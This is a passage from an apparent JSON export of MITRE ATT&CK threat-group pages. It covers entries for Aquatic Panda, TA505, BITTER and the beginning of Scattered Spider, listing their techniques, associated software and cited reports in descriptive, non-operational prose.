.004 Masquerading: Masquerade Task or Service Aquatic Panda created new, malicious services using names such as Windows User Service to attempt to blend in with legitimate items on victim systems.[2] .005 Masquerading: Match Legitimate Resource Name or Location Aquatic Panda renamed or moved malicious binaries to legitimate locations to evade defenses and blend into victim environments.[2] Enterprise T1112 Modify Registry Aquatic Panda modified the victim registry to enable the RestrictedAdmin mode feature, allowing for pass the hash behaviors to function via RDP.[2] Enterprise T1027 .010 Obfuscated Files or Information: Command Obfuscation Aquatic Panda has encoded PowerShell commands in Base64.[1] Enterprise T1588 .001 Obtain Capabilities: Malware Aquatic Panda has acquired and used njRAT in its operations.[1] .002 Obtain Capabilities: Tool Aquatic Panda has acquired and used Cobalt Strike in its operations.[1] Enterprise T1003 .001 OS Credential Dumping: LSASS Memory Aquatic Panda has attempted to harvest credentials through LSASS memory dumping.[1] Enterprise T1021 Remote Services Aquatic Panda used remote scheduled tasks to install malicious software on victim systems during lateral movement actions.[2] .001 Remote Desktop Protocol Aquatic Panda leveraged stolen credentials to move laterally via RDP in victim environments.[2] .002 SMB/Windows Admin Shares Aquatic Panda used remote shares to enable lateral movement in victim environments.[2] .004 SSH Aquatic Panda used SSH with captured user credentials to move laterally in victim environments.[2] Enterprise T1518 .001 Software Discovery: Security Software Discovery Aquatic Panda has attempted to discover third party endpoint detection and response (EDR) tools on compromised systems.[1] Enterprise T1218 .011 System Binary Proxy Execution: Rundll32 Aquatic Panda used rundll32.exe to proxy execution of a malicious DLL file identified as a keylogging binary.[2] Enterprise T1082 System Information Discovery Aquatic Panda has used native OS commands to understand privilege levels and system details.[1] Enterprise T1033 System Owner/User Discovery Aquatic Panda gathers information on recently logged-in users on victim devices.[2] Enterprise T1007 System Service Discovery Aquatic Panda has attempted to discover services for third party EDR products.[1] Enterprise T1550 .002 Use Alternate Authentication Material: Pass the Hash Aquatic Panda used a registry edit to enable a Windows feature called RestrictedAdmin in victim environments. This change allowed Aquatic Panda to leverage \"pass the hash\" mechanisms as the alteration allows for RDP connections with a valid account name and hash only, without possessing a cleartext password value.[2] Enterprise T1078 .002 Valid Accounts: Domain Accounts Aquatic Panda used multiple mechanisms to capture valid user accounts for victim domains to enable lateral movement and access to additional hosts in victim environments.[2] Enterprise T1047 Windows Management Instrumentation Aquatic Panda used WMI for lateral movement in victim environments.[2] Software ID Name References Techniques S0154 Cobalt Strike [1] Abuse Elevation Control Mechanism: Sudo and Sudo Caching, Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation: Parent PID Spoofing, Access Token Manipulation: Token Impersonation/Theft, Access Token Manipulation: Make and Impersonate Token, Account Discovery: Domain Account, Application Layer Protocol: DNS, Application Layer Protocol: Web Protocols, Application Layer Protocol: File Transfer Protocols, BITS Jobs, Browser Session Hijacking, Command and Scripting Interpreter: JavaScript, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Python, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data Encoding: Standard Encoding, Data from Local System, Data Obfuscation: Protocol or Service Impersonation, Data Transfer Size Limits, Deobfuscate/Decode Files or Information, Encrypted Channel: Asymmetric Cryptography, Encrypted Channel: Symmetric Cryptography, Exploitation for Client Execution, Exploitation for Privilege Escalation, File and Directory Discovery, Hide Artifacts: Process Argument Spoofing, Impair Defenses: Disable or Modify Tools, Indicator Removal: Timestomp, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Native API, Network Service Discovery, Network Share Discovery, Non-Application Layer Protocol, Obfuscated Files or Information: Indicator Removal from Tools, Obfuscated Files or Information, Office Application Startup: Office Template Macros, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Security Account Manager, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Process Discovery, Process Injection: Dynamic-link Library Injection, Process Injection: Process Hollowing, Process Injection, Protocol Tunneling, Proxy: Domain Fronting, Proxy: Internal Proxy, Query Registry, Reflective Code Loading, Remote Services: Remote Desktop Protocol, Remote Services: SSH, Remote Services: Windows Remote Management, Remote Services: SMB/Windows Admin Shares, Remote Services: Distributed Component Object Model, Remote System Discovery, Scheduled Transfer, Screen Capture, Software Discovery, Subvert Trust Controls: Code Signing, System Binary Proxy Execution: Rundll32, System Network Configuration Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, Use Alternate Authentication Material: Pass the Hash, Valid Accounts: Domain Accounts, Valid Accounts: Local Accounts, Windows Management Instrumentation S0385 njRAT [1] Application Layer Protocol: Web Protocols, Application Window Discovery, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Credentials from Password Stores: Credentials from Web Browsers, Data Encoding: Standard Encoding, Data from Local System, Dynamic Resolution: Fast Flux DNS, Exfiltration Over C2 Channel, File and Directory Discovery, Impair Defenses: Disable or Modify System Firewall, Indicator Removal: File Deletion, Indicator Removal: Clear Persistence, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Native API, Non-Standard Port, Obfuscated Files or Information: Encrypted/Encoded File, Obfuscated Files or Information: Compile After Delivery, Peripheral Device Discovery, Process Discovery, Query Registry, Remote Services: Remote Desktop Protocol, Remote System Discovery, Replication Through Removable Media, Screen Capture, System Information Discovery, System Owner/User Discovery, Video Capture S0596 ShadowPad Aquatic Panda used ShadowPad as a remote access tool to victim environments.[2] Application Layer Protocol: DNS, Application Layer Protocol: File Transfer Protocols, Application Layer Protocol: Web Protocols, Data Encoding: Non-Standard Encoding, Deobfuscate/Decode Files or Information, Dynamic Resolution: Domain Generation Algorithms, Indicator Removal, Ingress Tool Transfer, Modify Registry, Non-Application Layer Protocol, Obfuscated Files or Information: Fileless Storage, Obfuscated Files or Information, Process Discovery, Process Injection, Process Injection: Dynamic-link Library Injection, Scheduled Transfer, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery, System Time Discovery S0645 Wevtutil Aquatic Panda uses Wevtutil to extract Windows security event log data from victim machines.[2] Data from Local System, Impair Defenses: Disable Windows Event Logging, Indicator Removal: Clear Windows Event Logs S0430 Winnti for Linux Aquatic Panda used Winnti for Linux for access to victim Linux hosts during intrusions[2]. Application Layer Protocol: Web Protocols, Deobfuscate/Decode Files or Information, Encrypted Channel: Symmetric Cryptography, Ingress Tool Transfer, Non-Application Layer Protocol, Obfuscated Files or Information: Encrypted/Encoded File, Rootkit, Traffic Signaling S0141 Winnti for Windows Aquatic Panda used Winnti for Windows for persistent access to Windows victims.[2] Abuse Elevation Control Mechanism: Bypass User Account Control, Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Create or Modify System Process: Windows Service, Deobfuscate/Decode Files or Information, Encrypted Channel: Symmetric Cryptography, Execution Guardrails: Environmental Keying, File and Directory Discovery, Indicator Removal: File Deletion, Indicator Removal: Timestomp, Ingress Tool Transfer, Masquerading: Match Legitimate Resource Name or Location, Native API, Non-Application Layer Protocol, Obfuscated Files or Information: Compression, Obfuscated Files or Information: Encrypted/Encoded File, Process Discovery, Proxy: External Proxy, Proxy: Internal Proxy, System Binary Proxy Execution: Rundll32, System Information Discovery, System Services: Service Execution References Wiley, B. et al. (2021, December 29). OverWatch Exposes AQUATIC PANDA in Possession of Log4Shell Exploit Tools During Hands-on Intrusion Attempt. Retrieved January 18, 2022. CrowdStrike. (2023). 2022 Falcon OverWatch Threat Hunting Report. Retrieved May 20, 2024. "
},
{
"id": 73,
"title": "TA505, Hive0065, Spandex Tempest, CHIMBORAZO, Group G0092",
"path": "/groups/G0092/index.html",
"content": " TA505 TA505 is a cyber criminal group that has been active since at least 2014. TA505 is known for frequently changing malware, driving global trends in criminal malware distribution, and ransomware campaigns involving Clop.[1][2][3][4][5] ID: G0092 \u24d8 Associated Groups: Hive0065, Spandex Tempest, CHIMBORAZO Version: 3.0 Created: 28 May 2019 Last Modified: 10 April 2024 Version Permalink Live Version Associated Group Descriptions Name Description Hive0065 [6] Spandex Tempest [7] CHIMBORAZO [7] Techniques Used Domain ID Name Use Enterprise T1087 .003 Account Discovery: Email Account TA505 has used the tool EmailStealer to steal and send lists of e-mail addresses to a remote server.[8] Enterprise T1583 .001 Acquire Infrastructure: Domains TA505 has registered domains to impersonate services such as Dropbox to distribute malware.[5] Enterprise T1071 .001 Application Layer Protocol: Web Protocols TA505 has used HTTP to communicate with C2 nodes.[6] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell TA505 has used PowerShell to download and execute malware and reconnaissance scripts.[1][9][10][11] .003 Command and Scripting Interpreter: Windows Command Shell TA505 has executed commands using cmd.exe.[8] .005 Command and Scripting Interpreter: Visual Basic TA505 has used VBS for code execution.[1][2][8][6] .007 Command and Scripting Interpreter: JavaScript TA505 has used JavaScript for code execution.[1][2] Enterprise T1555 .003 Credentials from Password Stores: Credentials from Web Browsers TA505 has used malware to gather credentials from Internet Explorer.[1] Enterprise T1486 Data Encrypted for Impact TA505 has used a wide variety of ransomware, such as Clop, Locky, Jaff, Bart, Philadelphia, and GlobeImposter, to encrypt victim files and demand a ransom payment.[1] Enterprise T1140 Deobfuscate/Decode Files or Information TA505 has decrypted packed DLLs with an XOR key.[4] Enterprise T1568 .001 Dynamic Resolution: Fast Flux DNS TA505 has used fast flux to mask botnets by distributing payloads across multiple IPs.[8] Enterprise T1562 .001 Impair Defenses: Disable or Modify Tools TA505 has used malware to disable Windows Defender.[5] Enterprise T1105 Ingress Tool Transfer TA505 has downloaded additional malware to execute on victim systems.[10][11][9] Enterprise T1559 .002 Inter-Process Communication: Dynamic Data Exchange TA505 has leveraged malicious Word documents that abused DDE.[2] Enterprise T1112 Modify Registry TA505 has used malware to disable Windows Defender through modification of the Registry.[5] Enterprise T1106 Native API TA505 has deployed payloads that use Windows API calls on a compromised host.[5] Enterprise T1027 .002 Obfuscated Files or Information: Software Packing TA505 has used UPX to obscure malicious code.[6] .010 Obfuscated Files or Information: Command Obfuscation TA505 has used base64 encoded PowerShell commands.[10][11] .013 Obfuscated Files or Information: Encrypted/Encoded File TA505 has password-protected malicious Word documents.[1] Enterprise T1588 .001 Obtain Capabilities: Malware TA505 has used malware such as Azorult and Cobalt Strike in their operations.[4] .002 Obtain Capabilities: Tool TA505 has used a variety of tools in their operations, including AdFind, BloodHound, Mimikatz, and PowerSploit.[4] Enterprise T1069 Permission Groups Discovery TA505 has used TinyMet to enumerate members of privileged groups.[6] TA505 has also run net group /domain.[8] Enterprise T1566 .001 Phishing: Spearphishing Attachment TA505 has used spearphishing emails with malicious attachments to initially compromise victims.[1][2][3][10][9][12][8][13][6] .002 Phishing: Spearphishing Link TA505 has sent spearphishing emails containing malicious links.[1][3][8][13] Enterprise T1055 .001 Process Injection: Dynamic-link Library Injection TA505 has been seen injecting a DLL into winword.exe.[6] Enterprise T1608 .001 Stage Capabilities: Upload Malware TA505 has staged malware on actor-controlled domains.[5] Enterprise T1553 .002 Subvert Trust Controls: Code Signing TA505 has signed payloads with code signing certificates from Thawte and Sectigo.[10][11][8] .005 Subvert Trust Controls: Mark-of-the-Web Bypass TA505 has used .iso files to deploy malicious .lnk files.[14] Enterprise T1218 .007 System Binary Proxy Execution: Msiexec TA505 has used msiexec to download and execute malicious Windows Installer files.[10][11][8] .011 System Binary Proxy Execution: Rundll32 TA505 has leveraged rundll32.exe to execute malicious DLLs.[10][11] Enterprise T1552 .001 Unsecured Credentials: Credentials In Files TA505 has used malware to gather credentials from FTP clients and Outlook.[1] Enterprise T1204 .001 User Execution: Malicious Link TA505 has used lures to get users to click links in emails and attachments. For example, TA505 makes their malware look like legitimate Microsoft Word documents, .pdf and/or .lnk files. [1][2][3][10][9][12][8][13] .002 User Execution: Malicious File TA505 has used lures to get users to enable content in malicious attachments and execute malicious files contained in archives. For example, TA505 makes their malware look like legitimate Microsoft Word documents, .pdf and/or .lnk files. [1][2][3][10][9][12][8][13][6] Enterprise T1078 .002 Valid Accounts: Domain Accounts TA505 has used stolen domain admin accounts to compromise additional hosts.[6] Software ID Name References Techniques S0552 AdFind [4] Account Discovery: Domain Account, Domain Trust Discovery, Permission Groups Discovery: Domain Groups, Remote System Discovery, System Network Configuration Discovery S1025 Amadey [5][15] Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Data from Local System, Deobfuscate/Decode Files or Information, Dynamic Resolution: Fast Flux DNS, Exfiltration Over C2 Channel, File and Directory Discovery, Ingress Tool Transfer, Modify Registry, Native API, Obfuscated Files or Information, Software Discovery: Security Software Discovery, Subvert Trust Controls: Mark-of-the-Web Bypass, System Information Discovery, System Location Discovery, System Network Configuration Discovery, System Owner/User Discovery S0344 Azorult [4] Access Token Manipulation: Create Process with Token, Credentials from Password Stores: Credentials from Web Browsers, Deobfuscate/Decode Files or Information, Encrypted Channel: Symmetric Cryptography, File and Directory Discovery, Indicator Removal: File Deletion, Ingress Tool Transfer, Process Discovery, Process Injection: Process Hollowing, Query Registry, Screen Capture, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery, System Time Discovery, Unsecured Credentials: Credentials In Files S0521 BloodHound [4] Account Discovery: Domain Account, Account Discovery: Local Account, Archive Collected Data, Command and Scripting Interpreter: PowerShell, Domain Trust Discovery, Group Policy Discovery, Native API, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Remote System Discovery, System Owner/User Discovery S0611 Clop [16][17] Command and Scripting Interpreter: Windows Command Shell, Data Encrypted for Impact, Deobfuscate/Decode Files or Information, File and Directory Discovery, Impair Defenses: Disable or Modify Tools, Inhibit System Recovery, Modify Registry, Native API, Network Share Discovery, Obfuscated Files or Information: Software Packing, Process Discovery, Service Stop, Software Discovery: Security Software Discovery, Subvert Trust Controls: Code Signing, System Binary Proxy Execution: Msiexec, System Location Discovery: System Language Discovery, Virtualization/Sandbox Evasion: Time Based Evasion S0154 Cobalt Strike [4] Abuse Elevation Control Mechanism: Sudo and Sudo Caching, Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation: Parent PID Spoofing, Access Token Manipulation: Token Impersonation/Theft, Access Token Manipulation: Make and Impersonate Token, Account Discovery: Domain Account, Application Layer Protocol: DNS, Application Layer Protocol: Web Protocols, Application Layer Protocol: File Transfer Protocols, BITS Jobs, Browser Session Hijacking, Command and Scripting Interpreter: JavaScript, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Python, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data Encoding: Standard Encoding, Data from Local System, Data Obfuscation: Protocol or Service Impersonation, Data Transfer Size Limits, Deobfuscate/Decode Files or Information, Encrypted Channel: Asymmetric Cryptography, Encrypted Channel: Symmetric Cryptography, Exploitation for Client Execution, Exploitation for Privilege Escalation, File and Directory Discovery, Hide Artifacts: Process Argument Spoofing, Impair Defenses: Disable or Modify Tools, Indicator Removal: Timestomp, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Native API, Network Service Discovery, Network Share Discovery, Non-Application Layer Protocol, Obfuscated Files or Information: Indicator Removal from Tools, Obfuscated Files or Information, Office Application Startup: Office Template Macros, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Security Account Manager, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Process Discovery, Process Injection: Dynamic-link Library Injection, Process Injection: Process Hollowing, Process Injection, Protocol Tunneling, Proxy: Domain Fronting, Proxy: Internal Proxy, Query Registry, Reflective Code Loading, Remote Services: Remote Desktop Protocol, Remote Services: SSH, Remote Services: Windows Remote Management, Remote Services: SMB/Windows Admin Shares, Remote Services: Distributed Component Object Model, Remote System Discovery, Scheduled Transfer, Screen Capture, Software Discovery, Subvert Trust Controls: Code Signing, System Binary Proxy Execution: Rundll32, System Network Configuration Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, Use Alternate Authentication Material: Pass the Hash, Valid Accounts: Domain Accounts, Valid Accounts: Local Accounts, Windows Management Instrumentation S0384 Dridex [1][2][6] Application Layer Protocol: Web Protocols, Browser Session Hijacking, Encrypted Channel: Symmetric Cryptography, Encrypted Channel: Asymmetric Cryptography, Hijack Execution Flow: DLL, Native API, Obfuscated Files or Information, Proxy, Proxy: Multi-hop Proxy, Remote Access Tools, Scheduled Task/Job: Scheduled Task, Software Discovery, System Binary Proxy Execution: Regsvr32, System Information Discovery, User Execution: Malicious File S0381 FlawedAmmyy [12][8][13] Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Clipboard Data, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter: PowerShell, Data from Local System, Data Obfuscation, Encrypted Channel: Symmetric Cryptography, Exfiltration Over C2 Channel, Indicator Removal: File Deletion, Ingress Tool Transfer, Input Capture: Keylogging, Input Capture, Peripheral Device Discovery, Permission Groups Discovery: Local Groups, Screen Capture, Software Discovery: Security Software Discovery, System Binary Proxy Execution: Rundll32, System Binary Proxy Execution: Msiexec, System Information Discovery, System Owner/User Discovery, Windows Management Instrumentation S0383 FlawedGrace [3][8][13] Obfuscated Files or Information: Encrypted/Encoded File S0460 Get2 [13] Application Layer Protocol: Web Protocols, Command and Scripting Interpreter, Process Discovery, Process Injection: Dynamic-link Library Injection, System Information Discovery, System Owner/User Discovery S0002 Mimikatz [4] Access Token Manipulation: SID-History Injection, Account Manipulation, Boot or Logon Autostart Execution: Security Support Provider, Credentials from Password Stores, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores: Windows Credential Manager, OS Credential Dumping: DCSync, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSASS Memory, OS Credential Dumping: LSA Secrets, Rogue Domain Controller, Steal or Forge Authentication Certificates, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Use Alternate Authentication Material: Pass the Ticket S0039 Net [8] Account Discovery: Domain Account, Account Discovery: Local Account, Account Manipulation: Additional Local or Domain Groups, Create Account: Local Account, Create Account: Domain Account, Indicator Removal: Network Share Connection Removal, Network Share Discovery, Password Policy Discovery, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Remote Services: SMB/Windows Admin Shares, Remote System Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, System Time Discovery S0194 PowerSploit [4] Access Token Manipulation, Account Discovery: Local Account, Audio Capture, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Boot or Logon Autostart Execution: Security Support Provider, Command and Scripting Interpreter: PowerShell, Create or Modify System Process: Windows Service, Credentials from Password Stores: Windows Credential Manager, Data from Local System, Domain Trust Discovery, Hijack Execution Flow: Path Interception by PATH Environment Variable, Hijack Execution Flow: Path Interception by Unquoted Path, Hijack Execution Flow: DLL, Hijack Execution Flow: Path Interception by Search Order Hijacking, Input Capture: Keylogging, Obfuscated Files or Information: Indicator Removal from Tools, Obfuscated Files or Information: Command Obfuscation, OS Credential Dumping: LSASS Memory, Process Discovery, Process Injection: Dynamic-link Library Injection, Query Registry, Reflective Code Loading, Scheduled Task/Job: Scheduled Task, Screen Capture, Steal or Forge Kerberos Tickets: Kerberoasting, Unsecured Credentials: Credentials in Registry, Unsecured Credentials: Group Policy Preferences, Windows Management Instrumentation S0461 SDBbot [13][6] Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Data from Local System, Deobfuscate/Decode Files or Information, Event Triggered Execution: Application Shimming, Event Triggered Execution: Image File Execution Options Injection, Exfiltration Over C2 Channel, File and Directory Discovery, Indicator Removal, Indicator Removal: File Deletion, Ingress Tool Transfer, Non-Application Layer Protocol, Obfuscated Files or Information: Software Packing, Obfuscated Files or Information, Process Discovery, Process Injection: Dynamic-link Library Injection, Proxy, Remote Services: Remote Desktop Protocol, System Binary Proxy Execution: Rundll32, System Information Discovery, System Location Discovery, System Network Configuration Discovery, System Owner/User Discovery, Video Capture S0382 ServHelper [3][10][11][8] Account Manipulation: Additional Local or Domain Groups, Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter: PowerShell, Create Account: Local Account, Encrypted Channel: Asymmetric Cryptography, Indicator Removal: File Deletion, Ingress Tool Transfer, Masquerading: Masquerade Account Name, Remote Services: Remote Desktop Protocol, Scheduled Task/Job: Scheduled Task, System Binary Proxy Execution: Rundll32, System Information Discovery, System Owner/User Discovery S0266 TrickBot [1][6] Account Discovery: Local Account, Account Discovery: Email Account, Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Browser Session Hijacking, Brute Force: Credential Stuffing, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Credentials from Password Stores: Password Managers, Credentials from Password Stores: Credentials from Web Browsers, Data Encoding: Standard Encoding, Data from Local System, Deobfuscate/Decode Files or Information, Domain Trust Discovery, Encrypted Channel: Symmetric Cryptography, Exfiltration Over C2 Channel, Exploitation of Remote Services, Fallback Channels, File and Directory Discovery, Firmware Corruption, Hide Artifacts: Hidden Window, Impair Defenses: Disable or Modify Tools, Ingress Tool Transfer, Input Capture: Credential API Hooking, Inter-Process Communication: Component Object Model, Masquerading, Modify Registry, Native API, Network Share Discovery, Non-Standard Port, Obfuscated Files or Information, Obfuscated Files or Information: Software Packing, Obfuscated Files or Information: Encrypted/Encoded File, Permission Groups Discovery, Phishing: Spearphishing Link, Phishing: Spearphishing Attachment, Pre-OS Boot: Bootkit, Process Discovery, Process Injection, Process Injection: Process Hollowing, Proxy: External Proxy, Remote Access Tools, Remote Services: VNC, Remote System Discovery, Scheduled Task/Job: Scheduled Task, Subvert Trust Controls: Code Signing, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery, System Service Discovery, Unsecured Credentials: Credentials In Files, Unsecured Credentials: Credentials in Registry, User Execution: Malicious File, Virtualization/Sandbox Evasion: Time Based Evasion References Proofpoint Staff. (2017, September 27). Threat Actor Profile: TA505, From Dridex to GlobeImposter. Retrieved May 28, 2019. Proofpoint Staff. (2018, June 8). TA505 shifts with the times. Retrieved May 28, 2019. Schwarz, D. and Proofpoint Staff. (2019, January 9). ServHelper and FlawedGrace - New malware introduced by TA505. Retrieved May 28, 2019. Terefos, A. (2020, November 18). TA505: A Brief History of Their Time. Retrieved July 14, 2022. Financial Security Institute. (2020, February 28). Profiling of TA505 Threat Group That Continues to Attack the Financial Sector. Retrieved July 14, 2022. Frydrych, M. (2020, April 14). TA505 Continues to Infect Networks With SDBbot RAT. Retrieved May 29, 2020. Microsoft . (2023, July 12). How Microsoft names threat actors. Retrieved November 17, 2023. Hiroaki, H. and Lu, L. (2019, June 12). Shifting Tactics: Breaking Down TA505 Group\u2019s Use of HTML, RATs and Other Techniques in Latest Campaigns. Retrieved May 29, 2020. Proofpoint Staff. (2018, July 19). TA505 Abusing SettingContent-ms within PDF files to Distribute FlawedAmmyy RAT. Retrieved April 19, 2019. Salem, E. (2019, April 25). Threat Actor TA505 Targets Financial Enterprises Using LOLBins and a New Backdoor Malware. Retrieved May 28, 2019. Vilkomir-Preisman, S. (2019, April 2). New ServHelper Variant Employs Excel 4.0 Macro to Drop Signed Payload. Retrieved September 16, 2024.. Proofpoint Staff. (2018, March 7). Leaked Ammyy Admin Source Code Turned into Malware. Retrieved May 28, 2019. Schwarz, D. et al. (2019, October 16). TA505 Distributes New SDBbot Remote Access Trojan with Get2 Downloader. Retrieved May 29, 2020. Trend Micro. (2019, August 27). TA505: Variety in Use of ServHelper and FlawedAmmyy. Retrieved February 22, 2021. Kasuya, M. (2020, January 8). Threat Spotlight: Amadey Bot Targets Non-Russian Users. Retrieved July 14, 2022. Santos, D. (2021, April 13). Threat Assessment: Clop Ransomware. Retrieved July 30, 2021. Cybereason Nocturnus. (2020, December 23). Cybereason vs. Clop Ransomware. Retrieved May 11, 2021. "
},
{
"id": 74,
"title": "BITTER, T-APT-17, Group G1002",
"path": "/groups/G1002/index.html",
"content": " BITTER BITTER is a suspected South Asian cyber espionage threat group that has been active since at least 2013. BITTER has targeted government, energy, and engineering organizations in Pakistan, China, Bangladesh, and Saudi Arabia.[1][2] ID: G1002 \u24d8 Associated Groups: T-APT-17 Version: 1.1 Created: 01 June 2022 Last Modified: 11 April 2024 Version Permalink Live Version Associated Group Descriptions Name Description T-APT-17 [1] Techniques Used Domain ID Name Use Enterprise T1583 .001 Acquire Infrastructure: Domains BITTER has registered a variety of domains to host malicious payloads and for C2.[2] Enterprise T1071 .001 Application Layer Protocol: Web Protocols BITTER has used HTTP POST requests for C2.[1][2] Enterprise T1568 Dynamic Resolution BITTER has used DDNS for C2 communications.[2] Enterprise T1573 Encrypted Channel BITTER has encrypted their C2 communications.[2] Enterprise T1203 Exploitation for Client Execution BITTER has exploited Microsoft Office vulnerabilities CVE-2012-0158, CVE-2017-11882, CVE-2018-0798, and CVE-2018-0802.[1][2] Enterprise T1068 Exploitation for Privilege Escalation BITTER has exploited CVE-2021-1732 for privilege escalation.[3][4] Enterprise T1105 Ingress Tool Transfer BITTER has downloaded additional malware and tools onto a compromised host.[1][2] Enterprise T1559 .002 Inter-Process Communication: Dynamic Data Exchange BITTER has executed OLE objects using Microsoft Equation Editor to download and run malicious payloads.[1] Enterprise T1036 .004 Masquerading: Masquerade Task or Service BITTER has disguised malware as a Windows Security update service.[1] Enterprise T1095 Non-Application Layer Protocol BITTER has used TCP for C2 communications.[2] Enterprise T1027 .013 Obfuscated Files or Information: Encrypted/Encoded File BITTER has used a RAR SFX dropper to deliver malware.[2] Enterprise T1588 .002 Obtain Capabilities: Tool BITTER has obtained tools such as PuTTY for use in their operations.[2] Enterprise T1566 .001 Phishing: Spearphishing Attachment BITTER has sent spearphishing emails with a malicious RTF document or Excel spreadsheet.[1][2] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task BITTER has used scheduled tasks for persistence and execution.[1] Enterprise T1608 .001 Stage Capabilities: Upload Malware BITTER has registered domains to stage payloads.[2] Enterprise T1204 .002 User Execution: Malicious File BITTER has attempted to lure victims into opening malicious attachments delivered via spearphishing.[1][2] Mobile T1660 Phishing BITTER has delivered malicious applications to victims via shortened URLs distributed through SMS, WhatsApp, and various social media platforms.[5] Software ID Name References Techniques S1013 ZxxZ [1] Data from Local System, Deobfuscate/Decode Files or Information, Ingress Tool Transfer, Masquerading: Masquerade Task or Service, Native API, Obfuscated Files or Information: Encrypted/Encoded File, Phishing: Spearphishing Attachment, Process Discovery, Query Registry, Scheduled Task/Job: Scheduled Task, Software Discovery: Security Software Discovery, System Information Discovery, System Owner/User Discovery, User Execution: Malicious File References Raghuprasad, C . (2022, May 11). Bitter APT adds Bangladesh to their targets. Retrieved June 1, 2022. Dela Paz, R. (2016, October 21). BITTER: a targeted attack against Pakistan. Retrieved June 1, 2022. JinQuan, MaDongZe, TuXiaoYi, and LiHao. (2021, February 10). Windows kernel zero-day exploit (CVE-2021-1732) is used by BITTER APT in targeted attack. Retrieved June 1, 2022. Microsoft. (2018, February 9). Windows Win32k Elevation of Privilege Vulnerability CVE-2021-1732. Retrieved June 1, 2022. BlackBerry Research and Insights Team. (n.d.). Mobile Malware and APT Espionage. Retrieved March 1, 2024. "
},
{
"id": 75,
"title": "Scattered Spider, Roasted 0ktapus, Octo Tempest, Storm-0875, Group G1015",
"path": "/groups/G1015/index.html",
"content": " Scattered Spider Scattered Spider is a native English-speaking cybercriminal group that has been active since at least 2022.[1][2] The group initially targeted customer relationship management and business-process outsourcing (BPO) firms as well as telecommunications and technology companies. Beginning in 2023, Scattered Spider expanded its operations to compromise victims in the gaming, hospitality, retail, MSP, manufacturing, and financial sectors.[2] During campaigns, Scattered Spider has leveraged targeted social-engineering techniques, attempted to bypass popular endpoint security tools, and more recently, deployed ransomware for financial gain.[3][4][1][2][5] ID: G1015 \u24d8 Associated Groups: Roasted 0ktapus, Octo Tempest, Storm-0875 Version: 2.0 Created: 05 July 2023 Last Modified: 04 April 2024 Version Permalink Live Version Associated Group Descriptions Name Description Roasted 0ktapus [4] Octo Tempest [6] Storm-0875 [6] Campaigns ID Name First Seen Last Seen References Techniques C0027 C0027 June 2022 [5] December 2022 [5] [5] Account Discovery: Cloud Account, Account Discovery: Email Account, Account Manipulation: Additional Cloud Roles, Account Manipulation: Device Registration, Account Manipulation: Additional Cloud Credentials, Data from Cloud Storage, Data from Information Repositories: Sharepoint, Exploit Public-Facing Application, External Remote Services, Gather Victim Identity Information: Credentials, Impersonation, Ingress Tool Transfer, Modify Cloud Compute Infrastructure: Create Cloud Instance, Multi-Factor Authentication Request Generation, Network Service Discovery, Obtain Capabilities: Tool, OS Credential Dumping: DCSync, Permission Groups Discovery: Cloud Groups, Phishing: Spearphishing Voice, Phishing for Information: Spearphishing Voice, Phishing for Information: Spearphishing Service, Protocol Tunneling, Proxy, Remote Access Tools, Remote Services: Cloud Services, Valid Accounts: Cloud Accounts, Web Service, Windows Management Instrumentation Techniques Used Domain ID Name Use Enterprise T1087 .002 Account Discovery: Domain Account Scattered Spider leverages legitimate domain accounts to gain access to the target environment.[3][2] .003 Account Discovery: Email Account During C0027, Scattered Spider accessed Azure AD to identify email addresses.[5] .004 Account Discovery: Cloud Account During C0027, Scattered Spider accessed Azure AD to download bulk lists of group members and to identify privileged users, along with the email addresses and AD attributes.[5] Enterprise T1098 .001 Account Manipulation: Additional Cloud Credentials During C0027, Scattered Spider used aws_consoler to create temporary federated credentials for fake users in order to obfuscate which AWS credential is compromised and enable pivoting from the AWS CLI to console sessions without MFA.[5] .003 Account Manipulation: Additional Cloud Roles During C0027, Scattered 